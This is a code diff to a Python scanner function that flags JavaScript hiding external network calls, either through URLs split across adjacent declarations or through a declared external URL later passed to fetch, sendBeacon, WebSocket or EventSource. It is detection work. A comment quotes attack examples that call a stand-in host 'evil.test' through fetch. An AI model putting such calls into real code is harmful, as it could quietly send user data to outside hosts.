@@ -421,30 +421,75 @@ def _scan_split_url_declarations(content: str) -> list[str]:
     """Fire 114: direct detection of the split-URL pattern regardless of
     constant-folding. Find pairs of adjacent const/let/var declarations
     where the string literals, concatenated, form an external URL.
+
+    Also (Fire 118): SINGLE decl whose value IS an external URL — gated
+    on the file containing any fetch / sendBeacon / WebSocket / EventSource
+    call. Catches the `const url = "..."; fetch(url)` indirection shape
+    that neither the fold nor the literal-arg scans see.
     """
     out = []
-    # Capture const/let/var <name> = "literal" on each line.
+    # Capture const/let/var <name> = "literal" on each line. Also handle
+    # destructuring-with-default forms like `const [url, setUrl] =
+    # useState("...")` — anywhere a string literal with a URL shape
+    # is assigned to a named binding.
     decl_re = re.compile(
+        r'(?:const|let|var)\s+(?:\w+|\[[^\]]+\])\s*=\s*[^"\'`\n]*?["\']([^"\'`\n]*)["\']'
+    )
+    named_decl_re = re.compile(
         r'(?:const|let|var)\s+(\w+)\s*=\s*["\']([^"\'`\n]*)["\']\s*;?'
     )
-    decls = [(m.group(1), m.group(2)) for m in decl_re.finditer(content)]
-    # Look at adjacent declarations (by source order) whose values
-    # concatenated would form http(s)://host/... with an external host.
-    for i in range(len(decls) - 1):
-        joined = decls[i][1] + decls[i + 1][1]
+    named_decls = [(m.group(1), m.group(2)) for m in named_decl_re.finditer(content)]
+    # Look at adjacent named declarations whose values concatenated would
+    # form http(s)://host/... with an external host.
+    for i in range(len(named_decls) - 1):
+        joined = named_decls[i][1] + named_decls[i + 1][1]
         m = re.match(r'(?:https?:)?//([^/\s]+)', joined)
         if m and _is_external(_host_of(m.group(1))):
             out.append(
-                f"split-URL declarations {decls[i][0]} + {decls[i+1][0]} → {_host_of(m.group(1))}"
+                f"split-URL declarations {named_decls[i][0]} + {named_decls[i+1][0]} → {_host_of(m.group(1))}"
             )
-        # 3-way: decls[i] + decls[i+1] + decls[i+2]
-        if i + 2 < len(decls):
-            joined3 = joined + decls[i + 2][1]
+        if i + 2 < len(named_decls):
+            joined3 = joined + named_decls[i + 2][1]
             m3 = re.match(r'(?:https?:)?//([^/\s]+)', joined3)
             if m3 and _is_external(_host_of(m3.group(1))):
                 out.append(
-                    f"split-URL declarations {decls[i][0]} + {decls[i+1][0]} + {decls[i+2][0]} → {_host_of(m3.group(1))}"
+                    f"split-URL declarations {named_decls[i][0]} + {named_decls[i+1][0]} + {named_decls[i+2][0]} → {_host_of(m3.group(1))}"
                 )
+
+    # Fire 118: single decl holding a full external URL whose binding name
+    # is ALSO passed to a network-call primitive. Attack shape:
+    #   const url = "https://evil.test/x"; fetch(url);
+    #   const [url, setUrl] = useState("https://evil.test/x"); fetch(url);
+    # Gating on "binding name used as network-call arg" avoids the false-
+    # positive of `const docsUrl = "https://..."; <a href={docsUrl}/>` —
+    # external URLs for user-visible navigation / display are fine.
+    binding_decl_re = re.compile(
+        r'(?:const|let|var)\s+(\w+|\[[^\]]+\]|\{[^}]+\})\s*=\s*[^"\'`\n]*?["\']([^"\'`\n]+)["\']'
+    )
+    for m in binding_decl_re.finditer(content):
+        binding = m.group(1)
+        val = m.group(2)
+        um = re.match(r'(?:https?:)?//([^/\s]+)', val.strip())
+        if not um:
+            continue
+        host = _host_of(um.group(1))
+        if not _is_external(host):
+            continue
+        # Extract bound names from the binding expression.
+        if binding.startswith("["):
+            names = re.findall(r'\w+', binding)[:1]  # first positional only
+        elif binding.startswith("{"):
+            names = re.findall(r'\w+', binding)
+        else:
+            names = [binding]
+        # Any of these names used as a network-call first arg?
+        for n in names:
+            if re.search(
+                rf'\b(?:fetch|sendBeacon|new\s+WebSocket|new\s+EventSource)\s*\(\s*{re.escape(n)}\b',
+                content,
+            ):
+                out.append(f"const URL decl {n} used in network call → {host}")
+                break
     return out
 
 
